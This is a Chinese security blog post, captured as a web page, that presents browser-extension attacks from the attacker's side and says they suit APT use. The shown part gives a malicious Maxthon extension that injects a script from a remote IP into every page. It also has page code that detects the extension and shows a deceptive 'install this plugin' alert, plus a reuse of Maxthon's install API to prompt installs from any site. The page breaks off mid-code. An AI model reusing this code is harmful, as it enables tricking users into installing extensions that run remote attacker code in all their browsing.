<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>浏览器插件的攻击向量 | Black-Hole&#39;s Blog | 一个脱离了高级趣味的恋爱狗</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  <meta name="theme-color" content="#3F51B5">
  
  
  <meta name="keywords" content="WEB安全">
  <meta name="description" content="0x0 前言： 我在很多地方都有说“浏览器插件的攻击方法”，本篇文章就带大家深入的研究一下“由浏览器插件引发的攻击手法及攻击代码”。本篇文章说的内容，可以给大家打开一个新的攻击思路，做APT攻击的话也会有奇效。 0x1 让自己变成攻击者： 我之前在群里问了一下，发现很多人都只是听说过，虽然知道原理。但是没有进行实践并且小瞧了这个攻击方式。而且这个攻击手法的案例也是少的可怜。没有攻何来守，之前chr">
<meta name="keywords" content="WEB安全">
<meta property="og:type" content="article">
<meta property="og:title" content="浏览器插件的攻击向量">
<meta property="og:url" content="http://bugs.cc/2016/10/05/浏览器插件的攻击向量/index.html">
<meta property="og:site_name" content="Black-Hole&#39;s Blog">
<meta property="og:description" content="0x0 前言： 我在很多地方都有说“浏览器插件的攻击方法”，本篇文章就带大家深入的研究一下“由浏览器插件引发的攻击手法及攻击代码”。本篇文章说的内容，可以给大家打开一个新的攻击思路，做APT攻击的话也会有奇效。 0x1 让自己变成攻击者： 我之前在群里问了一下，发现很多人都只是听说过，虽然知道原理。但是没有进行实践并且小瞧了这个攻击方式。而且这个攻击手法的案例也是少的可怜。没有攻何来守，之前chr">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/1.png">
<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/2.png">
<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/3.png">
<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/4.png">
<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/5.png">
<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/6.png">
<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/7.png">
<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/8.png">
<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/9.png">
<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/10.png">
<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/11.png">
<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/12.png">
<meta property="og:image" content="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/13.png">
<meta property="og:updated_time" content="2016-10-31T09:26:48.103Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="浏览器插件的攻击向量">
<meta name="twitter:description" content="0x0 前言： 我在很多地方都有说“浏览器插件的攻击方法”，本篇文章就带大家深入的研究一下“由浏览器插件引发的攻击手法及攻击代码”。本篇文章说的内容，可以给大家打开一个新的攻击思路，做APT攻击的话也会有奇效。 0x1 让自己变成攻击者： 我之前在群里问了一下，发现很多人都只是听说过，虽然知道原理。但是没有进行实践并且小瞧了这个攻击方式。而且这个攻击手法的案例也是少的可怜。没有攻何来守，之前chr">
<meta name="twitter:image" content="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/1.png">
  
    <link rel="alternative" href="/atom.xml" title="Black-Hole&#39;s Blog" type="application/atom+xml">
  
  <meta name="summary" content="&lt;h4 id=&quot;0x0-前言：&quot;&gt;&lt;a href=&quot;#0x0-前言：&quot; class=&quot;headerlink&quot; title=&quot;0x0 前言：&quot;&gt;&lt;/a&gt;0x0 前言：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;我在很多地方都有说“浏览器插件的攻击方法”，本篇文章就带大家深入的研究一下“由浏览器插件引发的攻击手法及攻击代码”。本篇文章说的内容，可以给大家打开一个新的攻击思路，做APT攻击的话也会有奇效。&lt;/p&gt;
&lt;h4 id=&quot;0x1-让自己变成攻击者：&quot;&gt;&lt;a href=&quot;#0x1-让自己变成攻击者：&quot; class=&quot;headerlink&quot; title=&quot;0x1 让自己变成攻击者：&quot;&gt;&lt;/a&gt;0x1 让自己变成攻击者：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;我之前在群里问了一下，发现很多人都只是听说过，虽然知道原理。但是没有进行实践并且小瞧了这个攻击方式。而且这个攻击手法的案例也是少的可怜。没有攻何来守，之前chrome有过类似的攻击手法，但是攻击代码所做的事比较少，于是本篇我们先成为攻击者，站在攻击者的角度来研究这个攻击手法。之前我在介绍这个攻击手法的时候都是在文章里开一个小节来说的。现在我专门来为这个攻击方法写篇文章，也希望让大家重视起来。&lt;/p&gt;
&lt;p&gt;在大家的理解里，浏览器插件攻击就是在插件里植入javascript代码，做一些盗取cookies的事情，但是事情远没有那么简单。&lt;/p&gt;
&lt;p&gt;大家都知道进行“浏览器插件攻击”就需要用户安装了你的插件。大家也都认为只有这一种方法，但是事实并非如此，下面是4种安装插件的方法：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件”&lt;/p&gt;
&lt;p&gt;被动等待，类似：姜太公钓鱼愿者上钩的感觉，插件就在那，你不安装总会有人安装&lt;/p&gt;
&lt;p&gt;基于社工库控制插件作者的账户，加入后门代码，更新插件&lt;/p&gt;
&lt;p&gt;控制插件里调用的第三方javascript代码&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;现在有四种方法供我们选择，我们一个个来进行介绍。&lt;br&gt;">
  <link rel="shortcut icon" href="/favicon.ico">
  <link rel="stylesheet" href="/css/style.css">
</head>

<body>
  <div id="loading" class="active"></div>

  <nav id="menu" class="hide" >
   <div class="inner flex-row-vertical">
  <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
      <i class="icon icon-lg icon-close"></i>
  </a>
  <div class="brand-wrap">
    <div class="brand">
      <a href="/" class="avatar"><img src="/img/logo.jpg"></a>
      <hgroup class="introduce">
        <h5 class="nickname">Black-Hole</h5>
        <a href="mailto:158blackhole@gmail.com" title="158blackhole@gmail.com" class="mail">158blackhole@gmail.com</a>
      </hgroup>
    </div>
  </div>
  <div class="scroll-wrap flex-col">
    <ul class="nav">
      
          <li class="waves-block waves-effect">
            <a href="/"  >
              <i class="icon icon-lg icon-home"></i>
              主页
            </a>
          </li>
      
          <li class="waves-block waves-effect">
            <a href="/archives"  >
              <i class="icon icon-lg icon-archives"></i>
              Archives
            </a>
          </li>
      
          <li class="waves-block waves-effect">
            <a href="/tags"  >
              <i class="icon icon-lg icon-tags"></i>
              Tags
            </a>
          </li>
      
          <li class="waves-block waves-effect">
            <a href="https://github.com/BlackHole1" target="_blank" >
              <i class="icon icon-lg icon-github"></i>
              Github
            </a>
          </li>
      
          <li class="waves-block waves-effect">
            <a href="http://weibo.com/comelove" target="_blank" >
              <i class="icon icon-lg icon-weibo"></i>
              Weibo
            </a>
          </li>
      
          <li class="waves-block waves-effect">
            <a href="/links"  >
              <i class="icon icon-lg icon-link"></i>
              Links
            </a>
          </li>
      
    </ul>

    <footer class="footer">
  <p><a rel="license" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="Creative Commons License" style="border-width:0;vertical-align:middle;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFAAAAAPCAMAAABEF7i9AAAAllBMVEUAAAD///+rsapERER3d3eIiIjMzMzu7u4iIiKUmZO6v7rKzsoODg4RERFVVVUNDQ0NDg0PEA8zMzNLTEtbXltmZmZydnF9gn2AgICPkI+ZmZmqqqq7u7vFxsXIzMgNDQwZGRkgICAhISEkJSMnKCcuMC4xMzE5Ozk7PTtBQkFCQkJDQ0Nna2eGhoaHh4ezuLLGysbd3d1wVGpAAAAA4UlEQVR42q2T1xqCMAyFk7QsBQeKA9x7j/d/OSm22CpX0nzcpA1/T05aAOuBVkMAScQFHLnEwoCo2f1TnQIGoVMewjZEjVFN4GH1Ue1Cn2jWqwfsOOj6wDwGvotsl/c8lv7KIq1eLOsT0HMFHMIE/RZyHnlphryT9zyV+8WH5e8yQw3wnQvgAFxPTKUVi555SHR/lOfLMgVTeDlSfN+TaoUsiTyeIm+bCkHvCA2FUKG48LDtYBZBknsYP/G8NTw0gaaHyuQf4H5pecrB/FYCT2sL9zAfy1Xyjou6L8X2W7YcLyBZCRtnq/zfAAAAAElFTkSuQmCC" /></a></p>
  <p>Black-Hole&#39;s Blog &copy; 2018</p>
  <p>Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme
  <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a></p>
  <a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-2x icon-rss-square"></i></a>
</footer>

  </div>
</div>

  </nav>
  <main id="main">
    <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">浏览器插件的攻击向量</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input " autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-share">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header">
  <div class="container">
    <h1 class="author">浏览器插件的攻击向量</h1>
    <h5 class="subtitle">
        
            <time datetime="2016-10-05T12:35:52.000Z" itemprop="datePublished" class="page-time">
  2016-10-05
</time>


        
    </h5>
  </div>
</header>

    <div class="container body-wrap">
      <article id="post-浏览器插件的攻击向量" 
  class="article article-type-post" itemprop="blogPost">
    <div class="post-meta flex-row">
        
	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WEB安全/">WEB安全</a></li></ul>

    </div>
    <div class="post-body">
        <aside class="post-widget" id="post-widget">

            
            <div class="post-share" id="post-share">
    <div class="tit">分享到：</div>
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" href="javascript:;" data-title="微博" data-service="tsina">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns" href="javascript:;" data-title="微信" data-service="weixin">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" href="javascript:;" data-title=" QQ" data-service="cqq">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" href="javascript:;" data-title=" Facebook" data-service="fb">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" href="javascript:;" data-title=" Twitter" data-service="twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="douban share-sns" href="javascript:;" data-title="豆瓣" data-service="douban">
          豆
        </a>
      </li>
    </ul>
 </div>

            

            
            <nav class="post-toc-wrap" id="post-toc">
            <ol class="post-toc"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x0-前言："><span class="post-toc-number">1.</span> <span class="post-toc-text">0x0 前言：</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x1-让自己变成攻击者："><span class="post-toc-number">2.</span> <span class="post-toc-text">0x1 让自己变成攻击者：</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#0x1-1-在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件”"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">0x1.1 在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件”</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#0x1-1-1-检测是否安装了某插件"><span class="post-toc-number">2.1.1.</span> <span class="post-toc-text">0x1.1.1 检测是否安装了某插件</span></a></li><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#0x1-1-2-欺骗用户进行半自动安装指定插件"><span class="post-toc-number">2.1.2.</span> <span class="post-toc-text">0x1.1.2 欺骗用户进行半自动安装指定插件</span></a></li></ol></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#0x1-2-被动等待"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">0x1.2 被动等待</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#0x1-3-基于社工库控制插件作者的账户"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">0x1.3 基于社工库控制插件作者的账户</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#0x1-4-控制插件里调用的第三方javascript代码"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">0x1.4 控制插件里调用的第三方javascript代码</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#0x1-4-1-不具有可视化页面"><span class="post-toc-number">2.4.1.</span> <span class="post-toc-text">0x1.4.1 不具有可视化页面</span></a></li><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#0x1-4-2-具有可视化页面"><span class="post-toc-number">2.4.2.</span> <span class="post-toc-text">0x1.4.2 具有可视化页面</span></a></li></ol></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#0x1-4-3-控制插件里调用的第三方javascript代码总结"><span class="post-toc-number">2.5.</span> <span class="post-toc-text">0x1.4.3 控制插件里调用的第三方javascript代码总结</span></a></li></ol></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x2-那些隐藏的API："><span class="post-toc-number">3.</span> <span class="post-toc-text">0x2 那些隐藏的API：</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x3-攻击向量："><span class="post-toc-number">4.</span> <span class="post-toc-text">0x3 攻击向量：</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#0x3-1-弹窗欺骗用户下载软件"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">0x3.1 弹窗欺骗用户下载软件</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#0x3-2-使用浏览器漏洞进行攻击"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">0x3.2 使用浏览器漏洞进行攻击</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#0x3-3-替换下载链接"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">0x3.3 替换下载链接</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#0x3-4-修改百排名"><span class="post-toc-number">4.4.</span> <span class="post-toc-text">0x3.4 修改百排名</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#0x3-4-内网嗅探"><span class="post-toc-number">4.5.</span> <span class="post-toc-text">0x3.4 内网嗅探</span></a></li></ol></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x4-结言："><span class="post-toc-number">5.</span> <span class="post-toc-text">0x4 结言：</span></a></li></ol>
            </nav>
            
        </aside>

        <div class="post-main">

            <div class="post-content" id="post-content" itemprop="postContent">
            <h4 id="0x0-前言："><a href="#0x0-前言：" class="headerlink" title="0x0 前言："></a>0x0 前言：</h4><hr>
<p>我在很多地方都有说“浏览器插件的攻击方法”，本篇文章就带大家深入的研究一下“由浏览器插件引发的攻击手法及攻击代码”。本篇文章说的内容，可以给大家打开一个新的攻击思路，做APT攻击的话也会有奇效。</p>
<h4 id="0x1-让自己变成攻击者："><a href="#0x1-让自己变成攻击者：" class="headerlink" title="0x1 让自己变成攻击者："></a>0x1 让自己变成攻击者：</h4><hr>
<p>我之前在群里问了一下，发现很多人都只是听说过，虽然知道原理。但是没有进行实践并且小瞧了这个攻击方式。而且这个攻击手法的案例也是少的可怜。没有攻何来守，之前chrome有过类似的攻击手法，但是攻击代码所做的事比较少，于是本篇我们先成为攻击者，站在攻击者的角度来研究这个攻击手法。之前我在介绍这个攻击手法的时候都是在文章里开一个小节来说的。现在我专门来为这个攻击方法写篇文章，也希望让大家重视起来。</p>
<p>在大家的理解里，浏览器插件攻击就是在插件里植入javascript代码，做一些盗取cookies的事情，但是事情远没有那么简单。</p>
<p>大家都知道进行“浏览器插件攻击”就需要用户安装了你的插件。大家也都认为只有这一种方法，但是事实并非如此，下面是4种安装插件的方法：</p>
<blockquote>
<p>在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件”</p>
<p>被动等待，类似：姜太公钓鱼愿者上钩的感觉，插件就在那，你不安装总会有人安装</p>
<p>基于社工库控制插件作者的账户，加入后门代码，更新插件</p>
<p>控制插件里调用的第三方javascript代码</p>
</blockquote>
<p>现在有四种方法供我们选择，我们一个个来进行介绍。<br><a id="more"></a></p>
<h5 id="0x1-1-在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件”"><a href="#0x1-1-在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件”" class="headerlink" title="0x1.1 在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件”"></a>0x1.1 在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件”</h5><p>这个方法类似于之前的问题<a href="http://www.cnbeta.com/articles/470593.htm" target="_blank" rel="external">强迫安装恶意Chrome扩展 攻击者使用激进方式</a>。这里我们也来实现一下并且优化下，此处使用的案例是“MaxThon遨游浏览器插件”。</p>
<h6 id="0x1-1-1-检测是否安装了某插件"><a href="#0x1-1-1-检测是否安装了某插件" class="headerlink" title="0x1.1.1 检测是否安装了某插件"></a>0x1.1.1 检测是否安装了某插件</h6><p>我们先把这个攻击方式的代码目录架构进行说明：</p>
<p>网站页面:<code>index.html</code></p>
<p>插件目录:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">icons/              插件的logo存放目录</div><div class="line"></div><div class="line">icons/icons.svg     插件logo文件</div><div class="line"></div><div class="line">def.json            插件的主控制文件，里面存着整个插件的配置</div><div class="line">代码如下:</div><div class="line">[</div><div class="line">    &#123;</div><div class="line">        &quot;type&quot;: &quot;extension&quot;,</div><div class="line">        &quot;frameworkVersion&quot;:&quot;1.0.0&quot;,</div><div class="line">        &quot;version&quot;:&quot;1.0.0&quot;,</div><div class="line">        &quot;guid&quot;: &quot;&#123;7c321680-7673-484c-bcc4-de10f453cb8e&#125;&quot;,</div><div class="line">        &quot;name&quot;: &quot;plug_setup&quot;,</div><div class="line">        &quot;author&quot;: &quot;Black-Hole&quot;,</div><div class="line">        &quot;svg_icon&quot;:&quot;icon.svg&quot;,</div><div class="line">        &quot;title&quot;: &#123;</div><div class="line">            &quot;zh-cn&quot;: &quot;欺骗用户安装插件&quot;</div><div class="line">        &#125;,</div><div class="line">        &quot;description&quot;:&#123;</div><div class="line">            &quot;zh-cn&quot;:&quot;欺骗用户安装插件&quot;</div><div class="line">        &#125;,</div><div class="line">        &quot;main&quot;:&quot;index.html&quot;,</div><div class="line">        &quot;actions&quot;: [</div><div class="line">            &#123;</div><div class="line">                &quot;type&quot;: &quot;script&quot;,</div><div class="line">                &quot;entryPoints&quot;: [</div><div class="line">                    &quot;doc_onload&quot;</div><div class="line">                ],</div><div class="line">                &quot;js&quot;: [</div><div class="line">                    &quot;base.js&quot;</div><div class="line">                ],</div><div class="line">        &quot;include&quot;: [&quot;*&quot;],</div><div class="line">        &quot;includeFrames&quot;: true</div><div class="line">             &#125;</div><div class="line">        ]</div><div class="line">    &#125;</div><div class="line">]</div><div class="line">base.js             每打开一个页面，要执行的JavaScript代码</div><div class="line">代码如下:</div><div class="line">后文会提到</div></pre></td></tr></table></figure></p>
<p>我翻遍了整个遨游插件的API手册，没有找到类似chrome Plug API的：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">chrome.runtime.onMessage.addListener(<span class="function"><span class="keyword">function</span> (<span class="params">request, sender, sendResponse</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span>(request.act == <span class="string">'ping'</span>)&#123;</div><div class="line">        sendResponse(&#123;<span class="string">"act"</span>: <span class="string">"tong"</span>&#125;);</div><div class="line">    &#125;</div><div class="line">&#125;)</div><div class="line">chrome.runtime.sendMessage(<span class="string">"extensionId"</span>, &#123;<span class="string">"act"</span>: <span class="string">"ping"</span>&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">response</span>)</span>&#123;</div><div class="line">    <span class="keyword">if</span>(response &amp;&amp; response.act == <span class="string">'tong'</span>)&#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'已安装'</span>);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'未安装'</span>);</div><div class="line">    &#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>既然没有找到，我们就要想其他比较Hack的办法来解决这个问题。</p>
<p>这里我使用的办法是利用JavaScript全局及setTimeout函数来解决这个问题。</p>
<p>首先在插件里的base.js文件里写入:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</div><div class="line">script.src = <span class="string">"http://119.29.58.242/control.js"</span>;</div><div class="line"><span class="built_in">document</span>.body.appendChild(script);</div></pre></td></tr></table></figure>
<p>上面，这段代码将会在每个页面里的body标签后面写入<code>&lt;script src=&quot;http://119.29.58.242/control.js&quot;&gt;&lt;/script&gt;</code>代码，而在<code>http://119.29.58.242/control.js</code>文件里的代码为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">window.plug_setup = function()&#123;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这时，用户打开任何一个网页，那个网页的全局函数中就会有一个名为plug_setup的函数，并且不具有任何作用，很容易让人忽略掉，只会在特殊的页面中才会起作用。</p>
<p>然后我们再在网站的页面里写：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span>(plug_setup)!=<span class="string">"function"</span>)&#123;</div><div class="line">        alret(<span class="string">"因网站升级，网站结合了浏览器插件给用户更好的使用体验，请安装xx插件后刷新此页面"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;,<span class="number">1000</span>)</div></pre></td></tr></table></figure></p>
<p>因为页面加载、网络等问题照成的延迟问题，这里我们设置为1秒后运行检测代码。1秒后，将会运行<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span>(plug_setup)!=<span class="string">"function"</span>)&#123;</div><div class="line">    alret(<span class="string">"因网站升级，网站结合了浏览器插件给用户更好的使用体验，请安装xx插件后刷新此页面"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这个时候如果全局没有plug_setup函数，将会运行下面的alert函数，告诉用户需要安装插件才可以访问。</p>
<h6 id="0x1-1-2-欺骗用户进行半自动安装指定插件"><a href="#0x1-1-2-欺骗用户进行半自动安装指定插件" class="headerlink" title="0x1.1.2 欺骗用户进行半自动安装指定插件"></a>0x1.1.2 欺骗用户进行半自动安装指定插件</h6><p>我觉的如果让用户安装插件的话，你跳转到页面，让用户把插件的信息、评论看完再安装，岂不是成功率大大降低了，而且也不符合网站的优化。《点石成金》一书上说过这样一句话“不要让用户思考”，这个虽然是网站设计里面的至理名言，但是也同样可以放在攻击里，当一个用户的思考变得更少时，那么他会有很大程度上会跟着攻击者设计好的路走。</p>
<p>于是，我分析了遨游浏览器安装插件页面里的JavaScript，发现遨游浏览器进行安装插件时调用API在任何页面都可以运行，会照成攻击者在页面写上一些JavaScript代码后，就会像遨游浏览器那样弹出一个框询问用户是否安装插件：</p>
<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/1.png" alt=""></p>
<p>我这里进行一些优化，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div></pre></td><td class="code"><pre><div class="line">var ERRORTEXT = &apos;非傲游浏览器或版本过低。&lt;a href=&quot;http://www.maxthon.cn&quot; target=&quot;_blank&quot;&gt;点此获取最新版本傲游浏览器&lt;/a&gt;&apos;</div><div class="line">function getInstallMessage(that, messagePack, type) &#123;</div><div class="line">    if (external.mxCall) &#123;</div><div class="line">        var packMxAttr = $(that).closest(messagePack);</div><div class="line">        if (type === &apos;skin&apos;) &#123;</div><div class="line">            // 浏览器框架版本号</div><div class="line">            var frameVersion = external.mxCall(&apos;GetSkinFxVersion&apos;);</div><div class="line">        &#125;</div><div class="line">        else if (type === &apos;app&apos;) &#123;</div><div class="line">            // 浏览器框架版本号</div><div class="line">            var frameVersion = external.mxCall(&apos;GetAppFxVersion&apos;);</div><div class="line">            // 下个版本上了就删掉--</div><div class="line">            if (frameVersion === &apos;1.0.0&apos;) &#123;</div><div class="line">                frameVersion = &apos;1.0.1&apos;;</div><div class="line">            &#125;</div><div class="line">            // --下个版本上了就删掉</div><div class="line">        &#125;</div><div class="line">        // 插件包框架版本号</div><div class="line">        var packMxVersion = packMxAttr.attr(&apos;file_def&apos;);</div><div class="line">        // 插件包url</div><div class="line">        var packUrl = packMxAttr.attr(&apos;file_url&apos;);</div><div class="line">        // 插件id</div><div class="line">        var packId = packMxAttr.attr(&apos;file_id&apos;);</div><div class="line">        installPack(frameVersion, packMxVersion, packUrl, type, packId);</div><div class="line">    &#125;</div><div class="line">    else &#123;</div><div class="line">        resultPop.show(&apos;浏览器不符&apos;, ERRORTEXT, &apos;确定&apos;);</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">function installPack(frameVersion, packMxVersion, packUrl, type, packId) &#123;</div><div class="line">    var isInstall = returnIsInstall(frameVersion, packMxVersion);</div><div class="line">    if (isInstall !== -1) &#123;</div><div class="line">        if (type === &apos;skin&apos;) &#123;</div><div class="line">            external.mxCall(&apos;InstallSkin&apos;, packUrl);</div><div class="line">        &#125;</div><div class="line">        else if (type === &apos;app&apos;) &#123;</div><div class="line">            external.mxCall(&apos;InstallApp&apos;, packUrl);</div><div class="line">        &#125;</div><div class="line">        getUser(packId);</div><div class="line">    &#125;</div><div class="line">    else &#123;</div><div class="line">        resultPop.show(&apos;浏览器不符&apos;, ERRORTEXT, &apos;确定&apos;);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">function returnIsInstall(frameVersion, packMxVersion) &#123;</div><div class="line">    var fvItem;</div><div 